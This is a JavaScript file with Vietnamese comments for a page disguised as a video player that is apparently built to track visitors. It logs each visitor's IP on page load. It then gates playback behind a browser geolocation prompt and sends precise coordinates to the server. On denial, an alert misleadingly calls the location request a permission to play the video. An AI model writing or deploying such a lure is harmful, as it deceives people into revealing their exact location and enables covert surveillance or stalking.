// Lấy các element cần thiết từ HTML
const triggerElement = document.getElementById("location-trigger");
const videoElement = document.querySelector(".background-video");
const playIcon = document.querySelector(".fa-play");

// --- HÀM TẢI VIDEO (Giữ nguyên) ---
async function loadActiveVideo() {
  try {
    const response = await fetch("/api/active-video");
    const data = await response.json();
    if (data.url) {
      const sourceElement = videoElement.querySelector("source");
      sourceElement.setAttribute("src", data.url);
      videoElement.load();
      console.log(
        "Video đã tải xong và sẵn sàng. Chờ người dùng click để phát."
      );
    }
  } catch (error) {
    console.error("Lỗi khi tải video chính:", error);
  }
}

// --- SỰ KIỆN VÀ LOGIC CHÍNH ---

// Khi trang tải xong, chỉ tải video và ghi log IP
document.addEventListener("DOMContentLoaded", () => {
  loadActiveVideo();
  fetch("/api/log-ip-location", { method: "POST" })
    .then((response) => response.json())
    .then((data) => console.log("Phản hồi từ IP logger:", data.message))
    .catch((error) => console.error("Lỗi khi tự động ghi log IP:", error));
});

// Lắng nghe sự kiện click vào khu vực "video"
triggerElement.addEventListener("click", () => {
  console.log("Người dùng click, chuẩn bị hỏi quyền vị trí...");

  // KHÔNG còn lệnh play() ở đây nữa.
  // Khi click, chỉ đơn giản là gọi hàm yêu cầu cấp quyền.
  requestLocationPermission();
});

// Hàm yêu cầu cấp quyền
function requestLocationPermission() {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
  } else {
    alert("Rất tiếc, trình duyệt của bạn không hỗ trợ lấy vị trí.");
  }
}

// === THAY ĐỔI QUAN TRỌNG NHẤT NẰM Ở ĐÂY ===

// Hàm được gọi khi người dùng ĐỒNG Ý cấp quyền
function successCallback(position) {
  console.log("Người dùng đã cấp quyền!");

  // BƯỚC 1: BẮT ĐẦU PHÁT VIDEO NGAY KHI ĐƯỢC CẤP QUYỀN
  if (playIcon) playIcon.style.display = "none"; // Ẩn icon play
  if (videoElement && videoElement.paused) {
    videoElement.play(); // Lệnh play() đã được di chuyển vào đây
  }

  // BƯỚC 2: Gửi log vị trí lên server
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  console.log(`Lấy vị trí thành công: Lat ${lat}, Lon ${lon}`);

  fetch("/api/log-precise-location", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ latitude: lat, longitude: lon }),
  })
    .then((response) => response.json())
    .then((data) =>
      console.log("Phản hồi từ server (ghi log chính xác):", data)
    )
    .catch((error) =>
      console.error("Lỗi khi gửi vị trí chính xác lên server:", error)
    );
}

// Hàm được gọi khi người dùng TỪ CHỐI cấp quyền hoặc có lỗi
function errorCallback(error) {
  console.log(`Có lỗi xảy ra hoặc người dùng từ chối: ${error.message}`);

  // Hiển thị lại icon play để người dùng có thể thử lại
  if (playIcon) playIcon.style.display = "block";

  switch (error.code) {
    case error.PERMISSION_DENIED:
      alert("Vui lòng cấp quyền phát video để xem tiếp  ");
      break;
    case error.POSITION_UNAVAILABLE:
      alert("Không thể xác định được vị trí của bạn.");
      break;
    case error.TIMEOUT:
      alert("Yêu cầu lấy vị trí đã hết hạn.");
      break;
    default:
      alert("Một lỗi không xác định đã xảy ra.");
      break;
  }
}
